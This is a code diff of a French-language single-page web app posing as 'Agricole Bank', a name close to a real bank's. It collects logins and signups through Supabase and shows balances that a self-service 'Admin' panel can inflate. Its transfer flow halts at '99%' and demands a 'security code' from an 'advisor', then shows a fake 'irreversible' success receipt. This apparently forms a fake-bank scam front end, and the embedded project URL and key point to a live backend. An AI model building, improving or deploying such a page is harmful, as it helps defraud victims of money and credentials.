@@ -9,10 +9,8 @@
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 
     <style> 
-        /* Styles Globaux & Thème */ 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
         body { background-color: #f8fafc; color: #1e293b; min-height: 100vh; display: flex; flex-direction: column; }
-        /* En-tête (Header) */ 
         header { background-color: #0f172a; color: #ffffff; padding: 15px 5%; display: flex; justify-content: space-between; align-items: center; box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05); }
         .logo-banque { font-size: 24px; font-weight: 800; letter-spacing: 1.5px; color: #ffffff; text-decoration: none; }
         .logo-banque span { color: #10b981; }
@@ -20,10 +18,8 @@
         .select-langue { background-color: #1e293b; color: #ffffff; border: 1px solid #475569; padding: 6px 12px; border-radius: 6px; font-size: 13px; cursor: pointer; outline: none; width: auto; }
         .statut-badge { display: flex; align-items: center; gap: 8px; font-size: 13px; background-color: #1e293b; padding: 8px 16px; border-radius: 20px; color: #10b981; font-weight: 600; }
         .point-vert { width: 8px; height: 8px; background-color: #10b981; border-radius: 50%; display: inline-block; box-shadow: 0 0 8px #10b981; }
-        /* Conteneur Principal */ 
         main { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 5%; }
         .card { background: #ffffff; border-radius: 16px; box-shadow: 0 15px 35px rgba(0, 0, 0, 0.05); width: 100%; max-width: 900px; overflow: hidden; }
-        /* ÉCRAN 1 : CONNEXION & CRÉATION DE COMPTE */ 
         #ecran-authentification { display: flex; min-height: 550px; }
         .auth-visuel { flex: 1; background: linear-gradient(135deg, #0f172a 0%, #065f46 100%); color: white; padding: 40px; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .svg-icon { width: 100px; height: 100px; margin-bottom: 25px; fill: #10b981; filter: drop-shadow(0px 8px 16px rgba(0,0,0,0.2)); }
@@ -40,12 +36,8 @@
         input:focus, select:focus { border-color: #10b981; background-color: #ffffff; box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1); }
         .btn-primaire { background-color: #10b981; color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; width: 100%; transition: background 0.2s; margin-top: 10px; }
         .btn-primaire:hover { background-color: #059669; }
-        
-        /* BANNIÈRE DE VALIDATION ADMIN COMPTE */
         .banniere-autorisation { background-color: #fffbeb; border: 1px solid #fef3c7; border-left: 5px solid #f59e0b; color: #b45309; padding: 15px; border-radius: 8px; margin-bottom: 20px; display: none; font-size: 14px; font-weight: 500; }
         .zone-admin-simul { background-color: #f1f5f9; padding: 20px; border-radius: 8px; text-align: left; margin-top: 25px; border: 1px dashed #cbd5e1; display: none; }
-        
-        /* ÉCRAN 2 : TABLEAU DE BORD & VIREMENT */ 
         #ecran-dashboard { display: none; padding: 40px; }
         .dashboard-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 30px; }
         @media (max-width: 768px) { .dashboard-grid { grid-template-columns: 1fr; } #ecran-authentification { flex-direction: column; } .header-droite { gap: 10px; } }
@@ -59,19 +51,16 @@
         .trans-info span { font-size: 12px; color: #64748b; }
         .trans-montant { font-size: 14px; font-weight: 600; }
         .trans-montant.negatif { color: #ef4444; } .trans-montant.positif { color: #10b981; }
-        /* ÉCRAN 3 : CHARGEMENT PROGRESSIF */ 
         #ecran-chargement { display: none; text-align: center; padding: 60px 40px; max-width: 500px; margin: 0 auto; }
         .spinner { width: 65px; height: 65px; border: 6px solid #f1f5f9; border-top: 6px solid #10b981; border-radius: 50%; margin: 0 auto 30px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .barre-conteneur { background-color: #e2e8f0; border-radius: 20px; height: 12px; width: 100%; margin: 25px 0; overflow: hidden; }
         .barre-interne { background-color: #10b981; height: 100%; width: 0%; transition: width 0.4s ease-out; }
         .pourcentage-texte { font-size: 36px; font-weight: 800; color: #0f172a; }
-        /* ÉCRAN 4 : CODE OTP */ 
         #ecran-code { display: none; text-align: center; padding: 50px 40px; max-width: 450px; margin: 0 auto; }
         .input-code { width: 80%; padding: 14px; font-size: 24px; letter-spacing: 8px; text-align: center; border: 2px solid #cbd5e1; border-radius: 8px; margin: 25px 0; font-weight: bold; outline: none; }
         .input-code:focus { border-color: #10b981; box-shadow: 0 0 0 4px rgba(16, 185, 129, 0.1); }
         .info-texte { color: #64748b; font-size: 14px; line-height: 1.6; margin-bottom: 20px; }
-        /* ÉCRAN 5 : REÇU SUCCÈS */ 
         #ecran-succes { display: none; text-align: center; padding: 50px 40px; max-width: 550px; margin: 0 auto; }
         .icon-succes-cadre { width: 100px; height: 100px; background-color: #ecfdf5; border-radius: 50%; display: flex; justify-content: center; align-items: center; margin: 0 auto 25px; box-shadow: 0 10px 20px rgba(16, 185, 129, 0.1); }
         .svg-handshake { width: 60px; height: 60px; fill: #10b981; }
@@ -90,7 +79,7 @@
 <header> 
     <a href="#" class="logo-banque"><span>Agricole</span> Bank</a> 
     <div class="header-droite"> 
-        <select class="select-langue" id="select-langue" onchange="changerLangue(this.value)"> 
+        <select class="select-langue" id="select-langue"> 
             <option value="fr">🇫🇷 Français</option> 
             <option value="en">🇺🇸 English</option> 
         </select> 
@@ -109,8 +98,8 @@
                 <svg class="svg-icon" viewBox="0 0 24 24"> 
                     <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/> 
                 </svg> 
-                <h3 id="auth-visuel-titre">Votre argent, parfaitement sécurisé</h3> 
-                <p id="auth-visuel-texte">Accédez à des virements internationaux instantanés et gérez votre patrimoine en toute simplicité avec l'infrastructure cryptée d'Agricole Bank.</p> 
+                <h3>Votre argent, parfaitement sécurisé</h3> 
+                <p>Accédez à des virements internationaux instantanés et gérez votre patrimoine en toute simplicité avec l'infrastructure cryptée d'Agricole Bank.</p> 
             </div> 
             <div class="auth-formulaire"> 
                 <div class="auth-onglets"> 
@@ -118,7 +107,6 @@
                     <button class="onglet" id="tab-inscription" onclick="changerOnglet('inscription')">Ouvrir un compte</button> 
                 </div>
                 
-                <!-- Zone des champs HTML -->
                 <div id="champs-auth"></div>
 
                 <button class="btn-primaire" id="btn-auth-action" onclick="gererAuthentificationOuInscription()">Accéder à mon espace</button> 
@@ -134,15 +122,15 @@
             <div class="dashboard-grid"> 
                 <div> 
                     <div class="carte-solde"> 
-                        <h4 id="lbl-solde-dispo">Solde Disponible</h4> 
+                        <h4>Solde Disponible</h4> 
                         <div class="montant-solde" id="solde-valeur">0,00 €</div> 
-                        <p id="lbl-compte-num" style="font-size: 12px; color: #94a3b8; margin-top: 5px;">Compte Courant Principal N° 4590-XXXX</p> 
+                        <p style="font-size: 12px; color: #94a3b8; margin-top: 5px;">Compte Courant Principal N° 4590-XXXX</p> 
                     </div>
-                    <h4 class="historique-titre" id="lbl-derniers-ops">Dernières opérations</h4> 
+                    <h4 class="historique-titre">Dernières opérations</h4> 
                     
                     <ul class="liste-transactions" id="conteneur-transactions-dynamique"></ul> 
 
-                    <button class="btn-primaire" id="btn-appel-admin" style="background-color: #475569; margin-top: 30px; font-size: 13px; padding: 10px;" onclick="ouvrirEspaceAdminSecurise()">🔧 Espace Admin (Contrôle Identité)</button>
+                    <button class="btn-primaire" style="background-color: #475569; margin-top: 30px; font-size: 13px; padding: 10px;" onclick="ouvrirEspaceAdminSecurise()">🔧 Espace Admin (Contrôle Identité)</button>
 
                     <div id="zone-admin-test" class="zone-admin-simul">
                         <h4 style="color: #0f172a; font-size: 14px; margin-bottom: 10px; font-weight: 700;">Panneau de Certification & Crédit Émetteur</h4>
@@ -154,22 +142,22 @@
                     </div>
                 </div>
                 <div> 
-                    <h3 style="margin-bottom: 5px; font-size: 18px;" id="lbl-initier-vir">Initier un nouveau virement</h3> 
-                    <p class="info-texte" style="margin-bottom: 20px;" id="lbl-initier-desc">Transférez vos fonds de manière sécurisée vers n'importe quelle institution financière mondiale.</p> 
+                    <h3 style="margin-bottom: 5px; font-size: 18px;">Initier un nouveau virement</h3> 
+                    <p class="info-texte" style="margin-bottom: 20px;">Transférez vos fonds de manière sécurisée vers n'importe quelle institution financière mondiale.</p> 
                     <div class="form-groupe"> 
-                        <label id="lbl-field-benef">Bénéficiaire (Nom complet)</label> 
+                        <label>Bénéficiaire (Nom complet)</label> 
                         <input type="text" id="vir-nom" placeholder="Ex: Cabinet Technique Durand"> 
                     </div>
                     <div class="form-groupe"> 
-                        <label id="lbl-field-iban">IBAN / Numéro de compte destinataire</label> 
+                        <label>IBAN / Numéro de compte destinataire</label> 
                         <input type="text" id="vir-iban" placeholder="FR76 3000 6000 1234..."> 
                     </div>
                     <div class="form-groupe"> 
-                        <label id="lbl-field-tel">N° Téléphone du Bénéficiaire</label> 
+                        <label>N° Téléphone du Bénéficiaire</label> 
                         <input type="tel" id="vir-tel" placeholder="Ex: +229 97 00 00 00"> 
                     </div>
                     <div class="form-groupe"> 
-                        <label id="lbl-field-montant">Montant de l'envoi</label> 
+                        <label>Montant de l'envoi</label> 
                         <div style="position: relative;"> 
                             <input type="number" id="vir-montant" placeholder="0.00"> 
                             <span id="symbole-devise-virement" style="position: absolute; right: 15px; top: 50%; transform: translateY(-50%); font-weight: bold; color: #64748b;">€</span> 
@@ -195,10 +183,10 @@
             <svg class="svg-icon" style="fill: #10b981; width: 80px; height: 80px;" viewBox="0 0 24 24"> 
                 <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/> 
             </svg> 
-            <h2 id="lbl-2fa-titre">Clé Interne d'Autorisation Requise</h2> 
-            <p class="info-texte"><span id="lbl-2fa-desc">Le transfert est suspendu à 99%. Veuillez insérer le code de sécurité obligatoire transmis par votre conseiller pour valider l'envoi de</span> <span id="rappel-montant" style="font-weight: bold; color: #0f172a;">0</span> <span class="devise-recap">€</span>.</p> 
+            <h2>Clé Interne d'Autorisation Requise</h2> 
+            <p class="info-texte">Le transfert est suspendu à 99%. Veuillez insérer le code de sécurité obligatoire transmis par votre conseiller pour valider l'envoi de <span id="rappel-montant" style="font-weight: bold; color: #0f172a;">0</span> <span class="devise-recap">€</span>.</p> 
             <input type="text" class="input-code" id="code-otp" placeholder="XXXXXX" maxlength="6"> 
-            <button class="btn-primaire" id="btn-2fa-valider" onclick="finaliserTransaction()">Valider définitivement l'opération</button> 
+            <button class="btn-primaire" onclick="finaliserTransaction()">Valider définitivement l'opération</button> 
         </div> 
         
         <!-- ÉCRAN 5 : SUCCÈS --> 
@@ -208,19 +196,19 @@
                     <path d="M22.09 10.12l-2.45-2.45a2.53 2.53 0 0 0-3.58 0l-1.92 1.92-2.31-2.31a2.53 2.53 0 0 0-3.58 0L3.18 12.3a2.53 2.53 0 0 0 0 3.58l2.45 2.45a2.53 2.53 0 0 0 3.58 0l1.92-1.92 2.31 2.31a2.53 2.53 0 0 0 3.58 0l5.07-5.02a2.53 2.53 0 0 0 0-3.58zM8.34 17.45l-4.28-4.27a.76.76 0 0 1 0-1.07l1.07-1.07.54.54a1.26 1.26 0 0 0 1.78 0 1.26 1.26 0 0 0 0-1.78l-.54-.54 1.07-1.07a.76.76 0 0 1 1.07 0l4.28 4.27a.76.76 0 0 1 0 1.07l-4.28 4.27a.77.77 0 0 1-1.07 0zm11.23-4.27l-4.28 4.28a.76.76 0 0 1-1.07 0l-2.31-2.31 1.39-1.39a1.26 1.26 0 0 0 0-1.78 1.26 1.26 0 0 0-1.78 0l-1.39 1.39-1.07-1.07a.76.76 0 0 1 0-1.07l4.28-4.28a.76.76 0 0 1 1.07 0l4.28 4.28a.76.76 0 0 1 0 1.07z"/> 
                 </svg> 
             </div> 
-            <h2 class="titre-succes" id="lbl-success-titre">Transfert Exécuté avec Succès</h2> 
-            <p class="info-texte" id="lbl-success-desc">Les fonds ont été chiffrés et transmis au réseau de compensation d'Agricole Bank avec succès.</p> 
+            <h2 class="titre-succes">Transfert Exécuté avec Succès</h2> 
+            <p class="info-texte">Les fonds ont été chiffrés et transmis au réseau de compensation d'Agricole Bank avec succès.</p> 
             <div class="badge-confiance"> 
                 <span class="point-vert"></span> 
-                <span id="lbl-success-certif">Transaction certifiée et enregistrée de manière irréversible</span> 
+                <span>Transaction certifiée et enregistrée de manière irréversible</span> 
             </div>
             <div class="recap-ticket"> 
-                <div class="recap-ligne"> <span class="recap-label" id="lbl-rec-benef">Bénéficiaire :</span> <span class="recap-valeur" id="recap-nom">Non spécifié</span> </div> 
-                <div class="recap-ligne"> <span class="recap-label" id="lbl-rec-iban">Numéro de compte / IBAN :</span> <span class="recap-valeur" id="recap-iban">Non spécifié</span> </div> 
-                <div class="recap-ligne"> <span class="recap-label" id="lbl-rec-statut">Statut de livraison :</span> <span class="recap-valeur" style="color: #10b981;" id="lbl-rec-statut-val">En cours d'acheminement</span> </div> 
-                <div class="recap-ligne"> <span class="recap-label" id="lbl-rec-montant">Montant Total Net :</span> <span class="recap-valeur montant-final" id="recap-montant">0,00 €</span> </div> 
+                <div class="recap-ligne"> <span class="recap-label">Bénéficiaire :</span> <span class="recap-valeur" id="recap-nom">Non spécifié</span> </div> 
+                <div class="recap-ligne"> <span class="recap-label">Numéro de compte / IBAN :</span> <span class="recap-valeur" id="recap-iban">Non spécifié</span> </div> 
+                <div class="recap-ligne"> <span class="recap-label">Statut de livraison :</span> <span class="recap-valeur" style="color: #10b981;">En cours d'acheminement</span> </div> 
+                <div class="recap-ligne"> <span class="recap-label">Montant Total Net :</span> <span class="recap-valeur montant-final" id="recap-montant">0,00 €</span> </div> 
             </div>
-            <button class="btn-primaire" style="background-color: #0f172a;" id="btn-success-dl" onclick="retourTableauDeBord()">Télécharger le reçu officiel</button> 
+            <button class="btn-primaire" style="background-color: #0f172a;" onclick="retourTableauDeBord()">Télécharger le reçu officiel</button> 
         </div>
     </div>
 </main>
@@ -231,13 +219,21 @@ const CODE_SECRET_VIREMENT = "2026";
 
 const SUPABASE_URL = "https://ktalxkmgxlndmayryaj.supabase.co";
 const SUPABASE_KEY = "Sb_publishable_DeE6ogyeeUgScQBEx4wyrw_iO6zz0cQ";
-var supabase = null;
 
-if (typeof window.supabase !== 'undefined') {
-    supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+var clientSupabase = null;
+
+function initialiserSupabase() {
+    try {
+        if (window.supabase && typeof window.supabase.createClient === 'function') {
+            clientSupabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+        } else if (typeof createClient === 'function') {
+            clientSupabase = createClient(SUPABASE_URL, SUPABASE_KEY);
+        }
+    } catch (e) {
+        console.error("Erreur d'initialisation Supabase:", e);
+    }
 }
 
-var langueActuelle = 'fr'; 
 var modeActuel = 'connexion';
 var donneesUtilisateurActuel = null;
 var userSession = null;
@@ -293,6 +289,8 @@ function changerOnglet(mode) {
 }
 
 async function gererAuthentificationOuInscription() {
+    if (!clientSupabase) initialiserSupabase();
+
     if (modeActuel === 'connexion') {
         var userSaisi = document.getElementById("auth-user").value;
         var passSaisi = document.getElementById("auth-pass").value;
@@ -302,23 +300,26 @@ async function gererAuthentificationOuInscription() {
             return;
         }
 
-        if (supabase) {
-            const { data, error } = await supabase.auth.signInWithPassword({
-                email: userSaisi,
-                password: passSaisi
-            });
+        if (clientSupabase) {
+            try {
+                const { data, error } = await clientSupabase.auth.signInWithPassword({
+                    email: userSaisi,
+                    password: passSaisi
+                });
 
-            if (error) {
-                alert("Identifiant ou mot de passe incorrect.");
-                return; // Bloque la connexion immédiatement
-            } else {
-                userSession = data.user;
-                await chargerProfilUtilisateur();
-                connexionReussie();
+                if (error) {
+                    alert("Mot de passe ou identifiant incorrect. Accès refusé.");
+                    return;
+                } else {
+                    userSession = data.user;
+                    await chargerProfilUtilisateur();
+                    connexionReussie();
+                }
+            } catch (err) {
+                alert("Erreur de connexion au serveur. Vérifiez vos identifiants réseau.");
             }
         } else {
-            alert("Erreur de connexion au serveur de sécurité.");
-            return;
+            alert("Le service de sécurité n'a pas pu se charger. Veuillez rafraîchir la page.");
         }
 
     } else {
@@ -329,33 +330,37 @@ async function gererAuthentificationOuInscription() {
         var deviseSaisie = document.getElementById("inscr-devise").value;
         
         if(!emailSaisi || !passSaisi) {
-            alert("Veuillez remplir tous les champs obligatoires.");
+            alert("Veuillez saisir votre email et votre mot de passe.");
             return;
         }
 
-        if (supabase) {
-            const { data, error } = await supabase.auth.signUp({
-                email: emailSaisi,
-                password: passSaisi,
-                options: {
-                    data: {
-                        nom: nomSaisi,
-                        telephone: telSaisi,
-                        solde: "0,00",
-                        devise: deviseSaisie,
-                        autorise: false
+        if (clientSupabase) {
+            try {
+                const { data, error } = await clientSupabase.auth.signUp({
+                    email: emailSaisi,
+                    password: passSaisi,
+                    options: {
+                        data: {
+                            nom: nomSaisi,
+                            telephone: telSaisi,
+                            solde: "0,00",
+                            devise: deviseSaisie,
+                            autorise: false
+                        }
                     }
-                }
-            });
+                });
 
-            if (error) {
-                alert("Erreur lors de la création : " + error.message);
-            } else {
-                alert("Espace client créé avec succès ! Connectez-vous maintenant.");
-                changerOnglet('connexion');
+                if (error) {
+                    alert("Erreur lors de la création : " + error.message);
+                } else {
+                    alert("Espace client créé avec succès ! Vous pouvez maintenant vous connecter.");
+                    changerOnglet('connexion');
+                }
+            } catch (err) {
+                alert("Erreur lors de la communication avec le serveur.");
             }
         } else {
-            alert("Erreur de connexion au serveur.");
+            alert("Le service de sécurité n'a pas pu se charger. Veuillez rafraîchir la page.");
         }
     }
 }
@@ -363,30 +368,35 @@ async function gererAuthentificationOuInscription() {
 async function chargerProfilUtilisateur() {
     if(!userSession) return;
     
+    var meta = userSession.user_metadata || {};
     donneesUtilisateurActuel = {
-        nom: userSession.user_metadata.nom || "Utilisateur",
-        solde: userSession.user_metadata.solde || "0,00",
-        devise: userSession.user_metadata.devise || "€",
-        autorise: userSession.user_metadata.autorise || false,
+        nom: meta.nom || "Utilisateur",
+        solde: meta.solde || "0,00",
+        devise: meta.devise || "€",
+        autorise: meta.autorise || false,
         transactions: []
     };
 
-    if (supabase) {
-        const { data, error } = await supabase
-            .from('transactions')
-            .select('*')
-            .eq('user_id', userSession.id)
-            .order('created_at', { ascending: false });
+    if (clientSupabase) {
+        try {
+            const { data, error } = await clientSupabase
+                .from('transactions')
+                .select('*')
+                .eq('user_id', userSession.id)
+                .order('created_at', { ascending: false });
 
-        if (!error && data) {
-            donneesUtilisateurActuel.transactions = data.map(function(item) {
-                return {
-                    titre: item.destinataire ? "Virement à " + item.destinataire : "Opération",
-                    date: new Date(item.created_at).toLocaleDateString(),
-                    montant: "-" + item.montant + " " + donneesUtilisateurActuel.devise,
-                    classe: "negatif"
-                };
-            });
+            if (!error && data) {
+                donneesUtilisateurActuel.transactions = data.map(function(item) {
+                    return {
+                        titre: item.destinataire ? "Virement à " + item.destinataire : "Opération",
+                        date: new Date(item.created_at).toLocaleDateString(),
+                        montant: "-" + item.montant + " " + donneesUtilisateurActuel.devise,
+                        classe: "negatif"
+                    };
+                });
+            }
+        } catch (e) {
+            console.log("Lecture historique impossible", e);
         }
     }
 }
@@ -450,8 +460,8 @@ async function certifierEtCrediterCompteAdmin() {
         donneesUtilisateurActuel.autorise = true;
         donneesUtilisateurActuel.solde = montantFormate;
         
-        if (supabase && userSession) {
-            await supabase.auth.updateUser({
+        if (clientSupabase && userSession) {
+            await clientSupabase.auth.updateUser({
                 data: {
                     autorise: true,
                     solde: montantFormate
@@ -537,8 +547,8 @@ async function finaliserTransaction() {
         var destinataire = document.getElementById("vir-nom").value;
         var montant = parseFloat(document.getElementById("vir-montant").value);
 
-        if(supabase && userSession) {
-            await supabase.from('transactions').insert([
+        if(clientSupabase && userSession) {
+            await clientSupabase.from('transactions').insert([
                 { user_id: userSession.id, destinataire: destinataire, montant: montant }
             ]);
         }
@@ -551,12 +561,12 @@ async function finaliserTransaction() {
 }
 
 function retourTableauDeBord() { 
-    alert("Reçu officiel enregistré. Téléchargement lancé en arrière-plan."); 
+    alert("Reçu officiel enregistré."); 
     location.reload(); 
 }
 
-// Initialisation au chargement de la page
 window.onload = function() {
+    initialiserSupabase();
     changerOnglet('connexion');
 };
 </script>
